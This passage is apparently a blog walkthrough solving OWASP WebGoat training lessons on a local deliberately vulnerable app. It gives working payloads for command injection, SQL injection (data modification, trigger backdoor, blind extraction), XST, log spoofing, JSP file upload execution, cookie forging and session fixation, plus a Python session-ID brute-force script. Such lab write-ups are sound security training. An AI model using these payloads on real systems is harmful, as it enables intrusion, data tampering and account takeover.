<p>So we know the value of a valid CSRF token. Then the URL to complete the transfer looks like this: <a href="http://localhost:8080/WebGoat/attack?Screen=2&amp;menu=900&amp;transferFunds=4000&amp;CSRFToken=-2114619905">http://localhost:8080/WebGoat/attack?Screen=2&amp;menu=900&amp;transferFunds=4000&amp;CSRFToken=-2114619905</a></p>

<p><strong>HTTPOnly Test</strong></p>

<p><img class="center" src="/images/webgoat/http_only.png" title="&lsquo;http only&rsquo; &lsquo;http only&rsquo;" ></p>

<p>This is a demo showing the cookie being protected with the HTTPOnly flag.</p>

<p><strong>Cross Site Tracing (XST) Attacks</strong></p>

<p>We are back on the good old shopping cart page, with a twist: &ldquo;Tomcat is configured to support the HTTP TRACE command. Your goal is to perform a Cross Site Tracing (XST) attack.&rdquo;</p>

<p><a href="https://capec.mitre.org/data/definitions/107.html">XST overview</a></p>

<blockquote><p>Cross Site Tracing (XST) enables an attacker to steal the victim&rsquo;s session cookie and possibly other authentication credentials transmitted in the header of the HTTP request when the
victim&rsquo;s browser communicates to destination system&rsquo;s web server. The attacker first gets a malicious script to run in the victim&rsquo;s browser that induces the browser to initiate an HTTP
TRACE request to the web server. If the destination web server allows HTTP TRACE requests, it will proceed to return a response to the victim&rsquo;s web browser that contains the original
HTTP request in its body. The function of HTTP TRACE, as defined by the HTTP specification, is to echo the request that the web server receives from the client back to the client. Since
the HTTP header of the original request had the victim&rsquo;s session cookie in it, that session cookie can now be picked off the HTTP TRACE response and sent to the attackers' malicious
site. XST becomes relevant when direct access to the session cookie via the &ldquo;document.cookie&rdquo; object is disabled with the use of httpOnly attribute which ensures that the cookie can be
transmitted in HTTP requests but cannot be accessed in other ways. Using SSL does not protect against XST.</p>

<p>If the system with which the victim is interacting is susceptible to XSS, an attacker can exploit that weakness directly to get his or her malicious script to issue an HTTP TRACE
request to the destination system&rsquo;s web server. In the absence of an XSS weakness on the site with which the victim is interacting, an attacker can get the script to come from the site
that he controls and get it to execute in the victim&rsquo;s browser (if he can trick the victim&rsquo;s into visiting his malicious website or clicking on the link that he supplies). However, in
that case, due to the same origin policy protection mechanism in the browser, the attackers' malicious script cannot directly issue an HTTP TRACE request to the destination system&rsquo;s web
server because the malicious script did not originate at that domain. An attacker will then need to find a way to exploit another weakness that would enable him or her to get around the
same origin policy protection.</p></blockquote>

<p>We know from before that the vulnerable field is the access code one. I borrowed from the solution, but haven&rsquo;t used an ActiveX object for the script:</p>

<p>``` js</p>

<script>
var http_request = new XMLHttpRequest();
http_request.open("TRACE", "./", false); 
http_request.send();
str1 = http_request.responseText; 
while (str1.indexOf("\n") > -1) str1 = str1.replace("\n","<br>"); 
document.write(str1);}
</script>


<p>```</p>

<p>And some info on the methods used:</p>

<ul>
<li><p><em>open()</em> &ndash; initialize a request. The parameters used were the HTTP method, the URL and an optional boolean signifying whether or not to perform the operation asynchronously. If this value is false, the send()method does not return until the response is received.</p></li>
<li><p><em>send()</em> &ndash; Sends the request. If the request is asynchronous (which is the default), this method returns as soon as the request is sent.</p></li>
</ul>


<h3>Improper Error Handling</h3>

<p><strong>Fail Open Authentication Scheme</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
This lesson presents the basics for understanding the &ldquo;fail open&rdquo; condition regarding authentication. The security term, “fail open” describes a behavior of a verification mechanism. This is when an error (i.e. unexpected exception) occurs during a verification method causing that method to evaluate to true. This is especially dangerous during login.</p>

<p><img class="center" src="/images/webgoat/fail_open.png" title="&lsquo;fail open authentication&rsquo; &lsquo;fail open authentication&rsquo;" ></p>

<p>Just logging in with a blank password won&rsquo;t cut it. From the hints and Java code, the correct way to exploit this is by removing the password parameter altogether. In WebScarab, the request looks like this: <code>Username=webgoat&amp;Password=&amp;SUBMIT=Login</code>. Get rid of the password and profit.</p>

<h3>Injection Flaws</h3>

<p><strong>Command Injection</strong></p>

<p><img class="center" src="/images/webgoat/os_cmd.png" title="&lsquo;command injection&rsquo; &lsquo;cmd injection&rsquo;" ></p>

<p>The server is retrieving the contents of the files by using the <em>cat</em> command. To insert a new command, I did this: <code>HelpFile=AccessControlMatrix.help;whoami&amp;SUBMIT=View</code>, but the result wasn&rsquo;t the one I expected:</p>

<p><code>plain
You are currently viewing: AccessControlMatrix.help;whoami
</code></p>

<p>The reason is that the filename is enclosed within quotes, and the command I appended just got literally interpreted as part of the quoted filename. To escape that, first close the quotes, then inject the command(s): <code>HelpFile=AccessControlMatrix.help";whoami;pwd"</code>. You also have to add quotes at the end, to close the stray quotes that you created when enclosing the filename.</p>

<p><strong>Numeric SQL Injection</strong></p>

<p><img class="center" src="/images/webgoat/num_sqli.png" title="&lsquo;numeric sqli&rsquo; &lsquo;numeric sqli&rsquo;" ></p>

<p>The injection is straightforward: <code>station=101 or 1=1&mdash; &amp;SUBMIT=Go%21</code></p>

<p><strong>Log Spoofing</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
This lesson teaches attempts to fool the human eye.</p>

<p><strong>How the attack works:</strong> The attack is based on fooling the human eye in log files. An attacker can erase his traces from the logs using this attack.</p>

<p><img class="center" src="/images/webgoat/log_spoof.png" title="&lsquo;log spoofing&rsquo; &lsquo;spoof logs&rsquo;" ></p>

<p>Whatever we input in the username box gets appended to the log file. To poison the log, do something like this:</p>

<p><code>plain
webgoat%0d%0aLogin succeeded for username:admin
</code></p>

<p>Using the CRLF attack, the log entries will now look like this:</p>

<p><code>plain
Login failed for username: webgoat
Login succeeded for username:admin
</code></p>

<p>We can add a script as well:</p>

<p><code>plain
webgoat%0d%0aLogin succeeded for username:admin&lt;script&gt;alert('Throw your logs in the trash')&lt;/script&gt;
</code></p>

<p><strong>XPATH Injection</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
This lesson teaches how to perform XPath Injection attacks.</p>

<p><strong>How the attack works:</strong>
Similar to SQL Injection, XPATH Injection attacks occur when a web site uses user supplied information to query XML data. By sending intentionally malformed information into the web site, an attacker can find out how the XML data is structured or access data that they may not normally have access to. They may even be able to elevate their privileges on the web site if the xml data is being used for authentication (such as an xml based user file). Querying XML is done with XPath, a type of simple descriptive statement that allows the xml query to locate a piece of information. Like SQL you can specify certain attributes to find and patterns to match. When using XML for a web site it is common to accept some form of input on the query string to identify the content to locate and display on the page. This input must be sanitized to verify that it doesn&rsquo;t mess up the XPath query and return the wrong data.</p>

<p><img class="center" src="/images/webgoat/xpathi.png" title="&lsquo;xpath injection&rsquo; &lsquo;xpath injection&rsquo;" ></p>

<p>To understand this injection, let&rsquo;s look at the following line:</p>

<p><code>java
String expression = "/employees/employee[loginID/text()='" + username + "' and passwd/text()='" + password + "']";
</code></p>

<p>With our credentials, it looks like this:</p>

<p><code>java
String expression = "/employees/employee[loginID/text()='" Mike  "' and passwd/text()='" test123 "']";
</code></p>

<p>And the injection is as follows: <code>&lsquo; or 'a&rsquo;=&lsquo;a</code>. Here&rsquo;s how it looks in the code:</p>

<p><code>java
String expression = "/employees/employee[loginID/text()='"   "' or 'a'='a' and passwd/text()='"  "' or 'a'='a']";
</code></p>

<p>In boolean logic, I think this boils down to:</p>

<p><code>False OR True AND False OR True</code></p>

<p>Since AND has higher precedence than OR, this becomes:</p>

<p><code>False OR False OR True = False OR True = True</code></p>

<p><strong>String SQL Injection</strong></p>

<p><img class="center" src="/images/webgoat/sqli.png" title="&lsquo;string sql injection&rsquo; &lsquo;string sql injection&rsquo;" ></p>

<p>The injection is simple: <code>&lsquo; or 1=1&mdash; </code>. The resulting SQL query is:</p>

<p><code>sql
SELECT * FROM user_data WHERE last_name = '' or 1=1-- '
</code></p>

<p><strong>LAB: SQL Injection</strong></p>

<p><strong>Stage 1:</strong> Use String SQL Injection to bypass authentication. Use SQL injection to log in as the boss (&lsquo;Neville&rsquo;) without using the correct password. Verify that Neville&rsquo;s profile can be viewed and that all functions are available (including Search, Create, and Delete).</p>

<p>Before injecting, I had to use Firebug to increase the maxlength attribute of the password field.The injection is <code>&lsquo; or 'a&rsquo;=&lsquo;a</code></p>

<p><strong>Stage 2: Block SQL Injection using a Parameterized Query.</strong></p>

<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>

<p>Implement a fix to block SQL injection into the fields in question on the Login page. Repeat stage 1. Verify that the attack is no longer effective.</p>

<p>I didn&rsquo;t think ahead to get the dev version, so skipping.</p>

<p><strong>Stage 3: Execute SQL Injection to bypass authorization.</strong></p>

<p>As regular employee &lsquo;Larry&rsquo;, use SQL injection into a parameter of the View function (from the List Staff page) to view the profile of the boss (&lsquo;Neville&rsquo;).</p>

<p>The request that needs to be exploited is this: <code>employee_id=101&amp;action=ViewProfile</code>.</p>

<p>And the SQL injection is <code>employee_id=101 or 1=1 order by salary desc</code>.</p>

<p>The reason for inserting the order by clause is because there is only one returned result and that needs to be the boss. And the boss has the biggest salary, right? By ordering the salary in descending order (from highest to lowest), we ensure that the first result is the boss' profile.</p>

<p><strong>Stage 4: Block SQL Injection using a Parameterized Query.</strong></p>

<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>

<p>Implement a fix to block SQL injection into the relevant parameter. Repeat stage 3. Verify that access to Neville&rsquo;s profile is properly blocked.</p>

<p>Skipped.</p>

<p><strong>Modify Data with SQL Injection</strong></p>

<p><img class="center" src="/images/webgoat/sql_modify.png" title="&lsquo;modify sql&rsquo; &lsquo;modify sql&rsquo;" ></p>

<p>Placing a quote in the box triggers an error: Unexpected end of command in statement [SELECT * FROM salaries WHERE userid = &lsquo;]</p>

<p>To modify data, we have to construct an injection that will execute another query: <code>jsmith';update salaries set salary = 50000 where userid=&lsquo;jsmith</code></p>

<p>The behind the scenes query is now:</p>

<p><code>sql
SELECT * FROM salaries WHERE userid = 'jsmith';update salaries set salary = 50000 where userid='jsmith'
</code></p>

<p>The UPDATE statement is used to update records in a table.</p>

<p><em>Syntax</em>:</p>

<p><code>sql
UPDATE table_name
SET column1=value1,column2=value2,...
WHERE some_column=some_value;
</code></p>

<p><strong>Add Data with SQL Injection</strong></p>

<p>This time, we have to add a record to the table. We can do it with this: <code>jsmith';insert into salaries values(&lsquo;hacker&rsquo;, 100000)&mdash; </code></p>

<p>And the query is:</p>

<p><code>sql
SELECT * FROM salaries WHERE userid = 'jsmith';insert into salaries values('hacker', 100000)-- '
</code></p>

<p>That pesky quote needed to be commented out.</p>

<p>The INSERT INTO statement is used to insert new records in a table.</p>

<p><em>Syntax:</em></p>

<p><code>sql
INSERT INTO table_name
VALUES (value1,value2,value3,...);
</code></p>

<p><strong>Database Backdoors</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
How to Create Database Back Door Attacks.</p>

<p><strong>How the attack works:</strong>
Databases are used usually as a backend for web applications. Also it is used as a media of storage. It can also be used as a place to store a malicious activity such as a trigger. A trigger is called by the database management system upon the execution of another database operation like insert, select, update or delete. An attacker for example can create a trigger that would set his email address instead of every new user&rsquo;s email address.</p>

<p><strong>General Goal(s):</strong>
* Your goal should be to learn how you can exploit a vulnerable query to create a trigger.
* You will not be able to actually create one in this lesson because the underlying database engine used with WebGoat doesn&rsquo;t support triggers.</p>

<p><img class="center" src="/images/webgoat/db_bkdor.png" title="&lsquo;db backdoor&rsquo; &lsquo;db backdoor&rsquo;" ></p>

<p>When you input your id, the query looks like this:</p>

<p><code>sql
select userid, password, ssn, salary, email from employee where userid=101
</code></p>

<p>The injection is: <code>101; update salaries set salary = 75000 where userid = &lsquo;larry&rsquo;</code></p>

<p>Now for stage 2:</p>

<p><img class="center" src="/images/webgoat/db_worm.png" title="&lsquo;db worm&rsquo; &lsquo;db worm&rsquo;" ></p>

<p>And the syntax for creating the trigger is:</p>

<p><code>sql
101; CREATE TRIGGER wyrm BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET salary = 1000 WHERE userid = NEW.userid
</code></p>

<p>This creates a trigger that will be executed for each row before the insert operation and that will set the salary to the given value for the newly inserted userid.</p>

<p><strong>Blind Numeric SQL Injection</strong></p>

<p><img class="center" src="/images/webgoat/blind_numsqli.png" title="&lsquo;blind numeric sqli&rsquo; &lsquo;blind numeric sqli&rsquo;" ></p>

<p>The page works like this: if you enter a correct account, you get this message: Account number is valid. Else, you get this: Invalid account number.</p>

<p>We need to add another condition to the query and cycle through attempts until we hit the jackpot. Like ANDing the original query with a true/false condition:</p>

<p><code>sql
101 AND ((SELECT pin FROM pins WHERE cc_number='1111222233334444') &gt; 10000 );
</code></p>

<p>Repeating this a couple of times, I determine that the PIN is higher than 2000 but lower than 2500. I will show here how to use Burp Suite for finding the right value.</p>

<ul>
<li><p>Start Burp and capture a normal request to the page</p></li>
<li><p>Send it to Intruder</p></li>
<li><p>In the Positions tab, keep only the relevant position (the account_number), and add a statement checking if the tested value is equal to the condition. It looks like this: <code>account_number=101 and 1=((SELECT pin FROM pins WHERE cc_number = &lsquo;1111222233334444&rsquo;)=§§)&amp;SUBMIT=Go%21</code>. The type of attack is the Sniper attack.</p></li>
<li><p>In the Payloads tab, load a file with some values</p></li>
<li><p>In the Options tab, under Grep-Match, add strings to be matched in responses (the messages for valid and invalind account numbers. Don&rsquo;t forget the dot at the end). And under Redirections, check to always follow redirections and to process cookies in redirections</p></li>
<li><p>Start the attack. Here&rsquo;s an example of the results:</p></li>
</ul>


<p><img class="center" src="/images/webgoat/intruder.png" title="&lsquo;burp intruder attack&rsquo; &lsquo;burp intruder attack&rsquo;" ></p>

<p>The correct PIN is 2364.</p>

<p><strong>Blind String SQL Injection</strong></p>

<p>The form below allows a user to enter an account number and determine if it is valid or not. Use this form to develop a true / false test check other entries in the database.</p>

<p>Reference Ascii Values: &lsquo;A&rsquo; = 65 &lsquo;Z&rsquo; = 90 &lsquo;a&rsquo; = 97 &lsquo;z&rsquo; = 122</p>

<p>The goal is to find the value of the field name in table pins for the row with the cc_number of 4321432143214321. The field is of type varchar, which is a string.</p>

<p>Put the discovered name in the form to pass the lesson. Only the discovered name should be put into the form field, paying close attention to the spelling and capitalization.</p>

<p>This is a variation of the previous attack. The difference is now we&rsquo;re dealing with a string.</p>

<p>The way to perform this attack is to use the SUBSTRING method to check for a boolean condition:</p>

<p><strong>SUBSTRING ( expression ,start , length )</strong></p>

<p><code>sql
101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 1, 1) &lt; 'Z' )
</code></p>

<p>This will check if the first letter of the name is lower than the ASCII value of letter Z. After you determine the first letter, you can continue testing for the next:</p>

<p><code>sql
101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 2, 1) &gt; 'a' )
</code></p>

<p>You can use BurpSuite like I did previously, to test for the letters. Something like: <code>account_number=101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number=&lsquo;4321432143214321&rsquo;), 1, 1) = &lsquo;J&rsquo; )&amp;SUBMIT=Go%21</code>, then move to the next letter, and so on. The payload position should be between the quotes.</p>

<p>The name we&rsquo;re looking for is Jill.</p>

<h3>Denial of Service</h3>

<p><strong>Denial of Service from Multiple Logins</strong></p>

<p><img class="center" src="/images/webgoat/dos.png" title="&lsquo;dos&rsquo; &lsquo;dos&rsquo;" ></p>

<p>This means that, if we exceed the multiple logins treshold, which is 2, the application should choke. First let&rsquo;s find out some user details:</p>

<p><img class="center" src="/images/webgoat/dos_login.png" title="&lsquo;dos login&rsquo; &lsquo;dos login&rsquo;" ></p>

<p>Login 3 times to complete this lesson.</p>

<h3>Insecure Communication</h3>

<p><strong>Insecure Login</strong></p>

<p><img class="center" src="/images/webgoat/insecure_login.png" title="&lsquo;insecure login&rsquo; &lsquo;insecure login&rsquo;" ></p>

<p>I started Wireshark and sniffed the the password. Here&rsquo;s how it looks like:</p>

<p><img class="center" src="/images/webgoat/sniff.png" title="&lsquo;sniff password&rsquo; &lsquo;sniff passwod&rsquo;" ></p>

<p>The password is sniffy.</p>

<p><strong>Stage2:</strong> Now you have to change to a secure connection. The URL should start with <a href="https://">https://</a> If your browser is complaining about the certificate just ignore it. Sniff again the traffic and answer the questions</p>

<p>This time, with the use of SSL, the password is no longer transmitted in plain text.</p>

<h3>Insecure Configuration</h3>

<p><strong>Forced Browsing</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
How to Exploit Forced Browsing.</p>

<p><strong>How the attack works:</strong>
Forced browsing is a technique used by attackers to gain access to resources that are not referenced, but are nevertheless accessible. One technique is to manipulate the URL in the browser by deleting sections from the end until an unprotected directory is found</p>

<p>*Your goal should be to try to guess the URL for the &ldquo;config&rdquo; interface.</p>

<p>*The &ldquo;config&rdquo; URL is only available to the maintenance personnel.</p>

<p>*The application doesn&rsquo;t check for horizontal privileges.</p>

<p>Can you try to force browse to the config page which should only be accessed by maintenance personnel?</p>

<p>The URL is <a href="http://localhost:8080/WebGoat/conf">http://localhost:8080/WebGoat/conf</a></p>

<h3>Insecure Storage</h3>

<p><strong>Encoding Basics</strong></p>

<p>This lesson will familiarize the user with different encoding schemes.</p>

<p>You can enter strings and see how they are encoded with different algorithms.</p>

<h3>Malicious Execution</h3>

<p><strong>Malicious File Execution</strong></p>

<p><img class="center" src="/images/webgoat/malware.png" title="&lsquo;malicious file execution&rsquo; &lsquo;malicious file execution&rsquo;" ></p>

<p>Upload an image. Then right-click it and select View Image Info (Firefox) to discover the upload path. The images get uploaded in the <a href="http://localhost:8080/WebGoat/uploads/">http://localhost:8080/WebGoat/uploads/</a> path</p>

<p>Armed with this knowledge, we can now upload a file containing code that creates the guest.txt file in the required location. Because of the underlying web application architecture, I had to use Java for this (hardly my choice for any coding). So I borrowed from the solution:</p>

<p><code>html
&lt;html&gt;
&lt;% java.io.File file = new java.io.File("/root/WebGoat-5.4/tomcat/webapps/WebGoat/mfe_target/guest.txt");
file.createNewFile(); %&gt;
&lt;/html&gt;
</code></p>

<p>I uploaded it as exe.jsp. Then I went to <a href="http://localhost:8080/WebGoat/uploads/exe.jsp.">http://localhost:8080/WebGoat/uploads/exe.jsp.</a> When you navigate to your uploaded file, you will see a blank page, but your code has executed. Refresh the lesson to complete it.</p>

<h3>Parameter Tampering</h3>

<p><strong>Bypass HTML Field Restrictions</strong></p>

<p><img class="center" src="/images/webgoat/html_fields.png" title="&lsquo;html field restrictions&rsquo; &lsquo;html field restrictions&rsquo;" ></p>

<p>For this, I used a combination of Live HTTP Headers and Firebug. I used Firebug to enable the disabled field by delething this part: <code>disabled=&ldquo;&rdquo;</code>. For the rest, I just intercepted the request and added random numbers and characters (including in the Submit button).</p>

<p><strong>Exploit Hidden Fields</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
Developers will use hidden fields for tracking, login, pricing, etc.. information on a loaded page. While this is a convenient and easy mechanism for the developer, they often don&rsquo;t validate the information that is received from the hidden field. This lesson will teach the attacker to find and modify hidden fields to obtain a product for a price other than the price specified</p>

<p><strong>General Goal(s):</strong>
The user should be able to exploit a hidden field to obtain a product at an incorrect price. Try to purchase the HDTV for less than the purchase price, if you have not done so already.</p>

<p>This is another shopping cart functionality. Find this in the source:</p>

<p><code>html
&lt;input type="HIDDEN" value="2999.99" name="Price"&gt;
</code></p>

<p>Edit it, and buy.</p>

<p><strong>Exploit Unchecked Email</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
It is always a good practice to validate all inputs. Most sites allow non-authenticated users to send email to a &lsquo;friend&rsquo;. This is a great mechanism for spammers to send out email using your corporate mail server.</p>

<p><img class="center" src="/images/webgoat/mail.png" title="&lsquo;mail&rsquo; &lsquo;mail&rsquo;" ></p>

<p>The first part of the attack is to add a script to the comment box. I entered a simple XSS alert:</p>

<p>``` plain</p>

<script>alert('Let's play Goat Simulator!')</script>


<p>```</p>

<p>You will see this: <em>The attack worked! Now try to attack another person than the admin.</em></p>

<p>For the second part, I intercepted the request with WebScarab and modified the mail address from the <em>to</em> field to an arbitrary address.</p>

<p><strong>Bypass Client Side JavaScript Validation</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
Client-side validation should not be considered a secure means of validating parameters. These validations only help reduce the amount of server processing time for normal users who do not know the format of required input. Attackers can bypass these mechanisms easily in various ways. Any client-side validation should be duplicated on the server side. This will greatly reduce the likelihood of insecure parameter values being used in the application.</p>

<p><strong>General Goal(s):</strong>
For this exercise, the web site requires that you follow certain rules when you fill out a form. The user should be able to break those rules, and send the website input that it wasn&rsquo;t expecting.</p>

<p>For this, I just used WebScarab to add some @ symbols in each field.</p>

<h3>Session Management Flaws</h3>

<p><strong>Hijack a Session</strong></p>

<p><img class="center" src="/images/webgoat/session_hijack.png" title="&lsquo;session hijack&rsquo; &lsquo;session hijack&rsquo;" ></p>

<p>When trying to log in, we can see a session ID that is not present on successful login: <code>WEAKID=10185-1409598474670</code>. This changes with every login attempt. To get more information about how the session ID is constructed, I used WebScarab&rsquo;s SessionID Analysis feature. From the Previous Requests list, I selected the POST request that had a 200 OK response (the one ending in WebGoat/attack). I tried to test it, and got the message that no session identifiers were found. I deleted the WEAKID cookie and tested again. This time I got a popup:</p>

<p><img class="center" src="/images/webgoat/weakid.png" title="&lsquo;weakid&rsquo; &lsquo;weakid&rsquo;" ></p>

<p>The next step is to collect some session IDs by selecting a number for samples and clicking Fetch. I used 50. Then, in the Analysis tab, select the WEAKID from the Session Identifier list. Here&rsquo;s a sample screen:</p>

<p><img class="center" src="/images/webgoat/session_analysis.png" title="&lsquo;weakid analysis&rsquo; &lsquo;weakid analysis&rsquo;" ></p>

<p>The part before the dash seems to increase sequentially, but we can spot some missing sequences: after 10236 comes 10238. So the goal here is to find a valid session ID with one of these missing sessions.</p>

<p>Let&rsquo;s look next at the part after the dash. Here too there is a pattern:</p>

<p>10187-1409601344<strong>499</strong></p>

<p>10188-1409601344<strong>590</strong></p>

<p>And so on. The bold part changes with each request, but in an incremental fashion. Look at the Difference tab. The values are really close to each other, except a few cases where there is a much higher value, sort of a double of the normal values. These are the session IDs that come after the missing IDs, which are the ones we want to use.</p>

<p><img class="center" src="/images/webgoat/diff.png" title="&lsquo;id difference&rsquo; &lsquo;id difference&rsquo;" ></p>

<p>In this example, we want the ID starting with 10208, but we don&rsquo;t know the part after the dash. But we know the previous and the next session ID values, so we can set boundaries:</p>

<p>10207-1409601346<strong>563</strong></p>

<p>10208-1409601346<strong>???</strong></p>

<p>10209-1409601346<strong>658</strong></p>

<p>Our session ID is between 564 and 657. I wrote a Python script to bruteforce the value:</p>

<p>``` python</p>

<h1>!/usr/bin/python</h1>

<p>import requests</p>

<p>url = &lsquo;<a href="http://localhost:8080/WebGoat/attack?Screen=72&amp;menu=1800">http://localhost:8080/WebGoat/attack?Screen=72&amp;menu=1800</a> HTTP/1.1&rsquo;</p>

<p>for wid in range(564, 658):</p>

<pre><code>weakid = "10208-1409601346%s" % wid
hdrs = {
    'Host': 'localhost:8080',
    'User-Agent': 'Firepython',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://localhost:8080/WebGoat/attack?Screen=72&amp;menu=1800',
    'Cookie': 'JSESSIONID=C22137013C4AA4A8D3D0FA4FB003DC37; __utma=111872281.104604641.1404757910.1408742568.1409390732.25; __utmz=111872281.1404757910.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none);WEAKID=%s' % weakid,
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-length': '67',
    'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q='
    }

payload = {'Username': 'goat',
'Password': 'goat',
'WEAKID': weakid,
'SUBMIT': 'Login'} 

req = requests.post(url, data=payload, headers=hdrs)
response = req.text
if 'Congratulations' in response:
    print response
    print weakid
</code></pre>

<p>```</p>

<p>The weak ID discovered by this script was 10208-1409601346610. I refreshed the page, and the lesson was complete.</p>

<p><strong>Spoof an Authentication Cookie</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
Many applications will automatically log a user into their site if the right authentication cookie is specified.   Some times the cookie values can be guessed if the algorithm for generating the cookie can be obtained.  Some times the cookies are left on the client machine and can be stolen by exploiting another system vulnerability.  Some times the cookies may be intercepted using Cross site scripting.  This lesson tries to make the student aware of authentication cookies and presents the student with a way to defeat the cookie authentication method in this lesson.</p>

<p><strong>General Goal(s):</strong>
The user should be able to bypass the authentication check. Login using the webgoat/webgoat account to see what happens. You may also try aspect/aspect. When you understand the authentication cookie, try changing your identity to alice.</p>

<p>Logging in as webgoat, I see the following:</p>

<p>*Your identity has been remembered</p>

<p>Welcome, webgoat</p>

<p>You have been authenticated with PARAMETERS</p>

<p>And I now have an AuthCookie with the value 65432ubphcfx. If I log in as aspect, the value of the cookie is 65432udfqtb. So the differing bits are:</p>

<p>webgoat: <strong>ubphcfx</strong></p>

<p>aspect: <strong>udfqtb</strong></p>

<p>The first thing to notice is the value length corresponds to the length of the username. When trying to make further sense of it, you notice a pattern:</p>

<ul>
<li><p>The letters in the username are reversed</p></li>
<li><p>Each letter is replaced with the next letter in the alphabet</p></li>
</ul>


<p>And the example for aspect:</p>

<p><code>plain
a -&gt; b
s -&gt; tb
p -&gt; qtb
e -&gt; fqtb
c -&gt; dfqtb
t -&gt; udfqtb
</code></p>

<p>So now we know how to craft a valid cookie for alice:</p>

<p><code>plain
a -&gt; b
l -&gt; mb
i -&gt; jmb
c -&gt; djmb
e -&gt; fdjmb
</code></p>

<p>All that&rsquo;s left is to login as alice, intercept the request and add the correct value for the cookie: 65432fdjmb. We now see this:</p>

<p>Welcome, alice</p>

<p>You have been authenticated with COOKIE</p>

<p><strong>Session Fixation</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
How to steal a session with a &lsquo;Session Fixation&rsquo;</p>

<p><strong>How the attack works:</strong>
A user is recognized by the server by an unique Session ID. If a user has logged in and is authorized he does not have to reauthorize when he revisits the application as the user is recognized by the Session ID. In some applications it is possible to deliver the Session ID in the Get-Request. Here is where the attack starts.</p>

<p>An attacker can send a hyperlink to a victim with a chosen Session ID. This can be done for example by a prepared mail which looks like an official mail from the application administrator. If the victim clicks on the link and logs in he is authorized by the Session ID the attacker has chosen. The attacker can visit the page with the same ID and is recognized as the victim and gets logged in without authorization.</p>

<p><strong>General Goal(s):</strong>
This lesson has several stages. You play the attacker but also the victim. After having done this lesson it should be understood how a Session Fixation in general works. It should be also understood that it is a bad idea to use the Get-Request for Session IDs.</p>

<p><img class="center" src="/images/webgoat/session_fixation.png" title="&lsquo;session fixation&rsquo; &lsquo;session fixation&rsquo;" ></p>

<p>For this, I added the SID inside the link in the mail body:</p>

<p><code>html
&lt;a href=/WebGoat/attack?Screen=56&amp;menu=1800&amp;SID=0123456&gt; Goat Hills Financial&lt;/a&gt;
</code></p>

<p><img class="center" src="/images/webgoat/session_fixation2.png" title="&lsquo;session fixation stage 2&rsquo; &lsquo;session fixation stage 2&rsquo;" ></p>

<p>Just click on the link for this stage.</p>

<p><strong>STAGE 3:</strong> The bank has asked you to verify your data. Log in to see if your details are correct. Your user name is Jane and your password is tarzan.</p>

<p>Just log in for this one.</p>

<p><strong>STAGE 4:</strong> It is time to steal the session now. Use following link to reach Goat Hills Financial.</p>

<p>You are: Hacker Joe</p>

<p>Jane has logged into her account. Go and grab her session! Use Following link to reach the login screen of the bank:</p>

<p><a href="http://localhost:8080/WebGoat/attack?Screen=56&amp;menu=1800&amp;SID=NOVALIDSESSION">http://localhost:8080/WebGoat/attack?Screen=56&amp;menu=1800&amp;SID=NOVALIDSESSION</a></p>

<p>On the login URL, replace the invalid SID with the one you used previously. You will now see Jane&rsquo;s details.</p>

<h3>Web Services</h3>

<p><strong>Create a SOAP Request</strong></p>

<p><img class="center" src="/images/webgoat/soap.png" title="&lsquo;soap&rsquo; &lsquo;soap&rsquo;" ></p>

<p>The answer is 4. Look for the operations under the <code>&lt;wsdl:portType name=&ldquo;SoapRequest&rdquo;></code> tag.</p>

<p><strong>Stage 2</strong> Now, what is the type of the (id) parameter in the &ldquo;getFirstNameRequest&rdquo; method: the answer is int. Chech for it here:</p>

<p><code>xml
&lt;wsdl:message name="getFirstNameRequest"&gt;
&lt;wsdl:part name="id" type="xsd:int"/&gt;
</code></p>

<p><strong>Stage 3</strong> Intercept the request and invoke any method by sending a valid SOAP request for a valid account.</p>

<p>You must access at least 2 of the methods to pass the lesson.</p>

<p>For this I used SoapUI. Start a new project and give it the wsdl URL:</p>

<p><img class="center" src="/images/webgoat/soapui.png" title="&lsquo;soapui&rsquo; &lsquo;soapui&rsquo;" ></p>

<p>You will see the available operations under the project. Select one of them and copy the request that you will use in the proxy.</p>

<p><img class="center" src="/images/webgoat/soapui2.png" title="&lsquo;soapui2&rsquo; &lsquo;soapui2&rsquo;" ></p>

<p>Replace the question mark with some value:</p>

<p><code>plain
&lt;id xsi:type="xsd:int"&gt;101&lt;/id&gt;
</code></p>

<p>Add the basic authentication credentials, then submit the request, and you will see the response in the right tab. The retrieved first name is Joe.</p>

<p><img class="center" src="/images/webgoat/soapui3.png" title="&lsquo;soapui3&rsquo; &lsquo;soapui3&rsquo;" ></p>

<p>Repeat for the other methods. My second choice was the credit card number, and for id 101 it was 987654321.</p>

<p><strong>WSDL Scanning</strong></p>

<p><img class="center" src="/images/webgoat/wsdl.png" title="&lsquo;wsdl scanning&rsquo; &lsquo;wsdl scanning&rsquo;" ></p>

<p>The objective here is to obtain some credit card numbers. Let&rsquo;s look again at the WSDL file:</p>

<p><code>xml
&lt;wsdl:operation name="getCreditCard" parameterOrder="id"&gt;
</code></p>

<p>We have a method for retrieving credit cards. All that&rsquo;s left is to, uhm, use it in your favorite proxy: <code>id=101&amp;field=getCreditCard&amp;SUBMIT=Submit</code>.</p>

<p><strong>Web Service SAX Injection</strong></p>

